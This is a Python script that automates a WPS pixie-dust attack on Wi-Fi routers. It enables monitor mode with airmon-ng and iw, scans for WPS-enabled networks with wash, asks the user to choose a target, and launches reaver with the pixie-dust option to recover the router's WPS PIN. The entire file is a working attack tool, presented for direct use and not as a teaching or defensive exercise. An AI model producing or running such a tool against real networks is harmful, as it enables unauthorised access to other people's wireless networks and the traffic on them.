#!/usr/bin/env python3
import subprocess
import os
import re
import time

def run(cmd, capture_output=False, check=False):
    return subprocess.run(cmd, shell=True, text=True,
                          capture_output=capture_output,
                          check=check)

def get_interfaces():
    result = run("ip -brief link | grep wl", capture_output=True)
    interfaces = re.findall(r"^(\w+)", result.stdout, re.MULTILINE)
    return interfaces

def enable_monitor_mode(interface):
    print(f"[+] Enabling monitor mode on {interface} using airmon-ng...")
    run(f"airmon-ng start {interface} > /dev/null 2>&1")

    result = run("iw dev", capture_output=True)
    interfaces = re.findall(r"Interface\s+(\w+)", result.stdout)
    mon_iface = next((i for i in interfaces if i != interface), None)

    if not mon_iface:
        print("[*] airmon-ng failed. Trying manual method...")
        run(f"ip link set {interface} down")
        run(f"iw dev {interface} set type monitor")
        run(f"ip link set {interface} up")
        mon_iface = interface

    # Confirm monitor mode
    mon_info = run(f"iw dev {mon_iface} info", capture_output=True).stdout
    if "type monitor" not in mon_info:
        print("[-] Monitor mode failed.")
        exit(1)

    print(f"[+] Monitor mode enabled on {mon_iface}")
    return mon_iface

def scan_wps_networks(mon_iface):
    print("[+] Scanning for WPS-enabled networks (15s)...")
    run(f"timeout 15s wash -i {mon_iface} > /tmp/wash_out.txt", check=False)

    with open("/tmp/wash_out.txt") as f:
        lines = f.readlines()

    networks = []
    for line in lines[2:]:
        match = re.match(r"^([0-9A-Fa-f:]{17})\s+(\d+)\s+.*\s+([^\s]+)\s*$", line)
        if match:
            bssid, channel, essid = match.groups()
            networks.append((bssid, channel, essid))

    return networks

def select_network(networks):
    print("[+] Select a target network:")
    for i, (bssid, channel, essid) in enumerate(networks):
        print(f"{i+1}) BSSID: {bssid} | CH: {channel} | ESSID: {essid}")
    while True:
        try:
            choice = int(input("Enter number: ")) - 1
            if 0 <= choice < len(networks):
                return networks[choice]
        except ValueError:
            pass
        print("Invalid choice. Try again.")

def start_attack(mon_iface, bssid, channel):
    print(f"[+] Starting pixie-dust attack on {bssid} (channel {channel})...")
    run(f"reaver -i {mon_iface} -b {bssid} -c {channel} -K 1 -vv")

def disable_monitor_mode(mon_iface):
    ask = input("Do you want to disable monitor mode? (y/n): ").lower()
    if ask == 'y':
        run(f"ip link set {mon_iface} down")
        run(f"iw dev {mon_iface} set type managed")
        run(f"ip link set {mon_iface} up")
        print("[+] Monitor mode disabled.")

def check_requirements():
    required = ["airmon-ng", "iw", "wash", "reaver", "pixiewps"]
    for tool in required:
        if not shutil.which(tool):
            print(f"[-] Required tool not found: {tool}")
            exit(1)

if __name__ == "__main__":
    import shutil
    if os.geteuid() != 0:
        print("[-] Please run as root.")
        exit(1)

    check_requirements()

    interfaces = get_interfaces()
    if not interfaces:
        print("[-] No wireless interfaces found.")
        exit(1)

    print("[+] Available wireless interfaces:")
    for i in interfaces:
        print(f" - {i}")
    iface = input("Enter your wireless interface (e.g., wlan0): ").strip()

    mon_iface = enable_monitor_mode(iface)
    networks = scan_wps_networks(mon_iface)

    if not networks:
        print("[-] No WPS-enabled networks found.")
        disable_monitor_mode(mon_iface)
        exit(1)

    bssid, channel, essid = select_network(networks)
    start_attack(mon_iface, bssid, channel)
    disable_monitor_mode(mon_iface)
